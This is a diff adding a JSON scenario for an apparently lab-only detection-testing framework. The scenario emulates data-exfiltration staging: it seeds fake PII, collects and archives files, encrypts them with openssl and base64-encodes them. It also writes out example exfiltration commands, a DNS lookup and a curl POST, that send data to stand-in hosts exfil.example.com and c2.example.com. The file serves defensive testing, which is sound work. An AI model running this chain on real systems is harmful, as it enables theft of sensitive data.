@@ -1,0 +1,58 @@
+{
+  "scenario_id": "exfil_prep_001",
+  "name": "Data Exfil Prep — Compress, Encrypt, Stage for Exfil",
+  "class_name": "collection_exfiltration",
+  "mode": "lab_only",
+  "risk_level": "high",
+  "hosts": ["workstation-1"],
+  "preconditions": ["telemetry collector active", "victim filesystem seeded"],
+  "behavior_profile": {
+    "exfil_collect": true,
+    "exfil_package": true,
+    "cleanup": true
+  },
+  "custom_behaviors": {
+    "exfil_collect": [
+      {"step_id": "seed_target_data", "command": "mkdir -p /tmp/ClawdianShield/loot && echo 'ssn=123-45-6789' > /tmp/ClawdianShield/loot/pii_record.txt && echo 'card=4111111111111111 exp=12/28 cvv=123' >> /tmp/ClawdianShield/loot/pii_record.txt && echo 'PRIVATE_KEY=MIIEpAIBAAKCAQEA...' > /tmp/ClawdianShield/loot/private_key.pem"},
+      {"step_id": "recursive_find", "command": "find /tmp/ClawdianShield -type f -name '*.txt' -o -name '*.conf' -o -name '*.pem' 2>/dev/null > /tmp/ClawdianShield/exfil_manifest.txt"},
+      {"step_id": "copy_to_stage", "command": "mkdir -p /tmp/ClawdianShield/stage && cp -r /tmp/ClawdianShield/loot/ /tmp/ClawdianShield/stage/"}
+    ],
+    "exfil_package": [
+      {"step_id": "tar_compress", "command": "cd /tmp/ClawdianShield && tar czf /tmp/ClawdianShield/exfil_bundle.tar.gz stage/ 2>/dev/null"},
+      {"step_id": "openssl_encrypt", "command": "openssl enc -aes-256-cbc -pbkdf2 -pass pass:FakeLabPass123 -in /tmp/ClawdianShield/exfil_bundle.tar.gz -out /tmp/ClawdianShield/exfil_bundle.enc 2>/dev/null || cp /tmp/ClawdianShield/exfil_bundle.tar.gz /tmp/ClawdianShield/exfil_bundle.enc"},
+      {"step_id": "b64_encode", "command": "base64 /tmp/ClawdianShield/exfil_bundle.enc > /tmp/ClawdianShield/exfil_bundle.b64 2>/dev/null || true"},
+      {"step_id": "dns_exfil_sim", "command": "echo 'nslookup $(cat /tmp/ClawdianShield/exfil_bundle.b64 | head -1 | cut -c1-40).exfil.example.com' > /tmp/ClawdianShield/dns_exfil_cmd.txt"},
+      {"step_id": "http_exfil_sim", "command": "echo 'curl -X POST http://c2.example.com/upload -d @/tmp/ClawdianShield/exfil_bundle.enc' > /tmp/ClawdianShield/http_exfil_cmd.txt"}
+    ]
+  },
+  "custom_behavior_techniques": {
+    "exfil_collect": "T1074.001",
+    "exfil_package": "T1560.001"
+  },
+  "custom_behavior_produces": {
+    "exfil_collect": ["file_events", "hash_deltas"],
+    "exfil_package": ["file_events", "hash_deltas", "process_events"]
+  },
+  "expected_telemetry": {
+    "file_events": true,
+    "hash_deltas": true,
+    "process_events": true
+  },
+  "detections_expected": [
+    "sensitive_data_aggregation",
+    "archive_creation_detected",
+    "encryption_tool_invoked",
+    "exfil_staging_directory"
+  ],
+  "success_criteria": [
+    "tar.gz creation detected by file_observer with hash",
+    "openssl encryption produces process_event + new file_create",
+    "exfil_manifest.txt aggregation surfaces as staging indicator"
+  ],
+  "safety_constraints": {
+    "lab_environment_only": true,
+    "no_real_exploit_logic": true,
+    "no_real_credential_attack_logic": true,
+    "no_unapproved_network_spread": true
+  }
+}
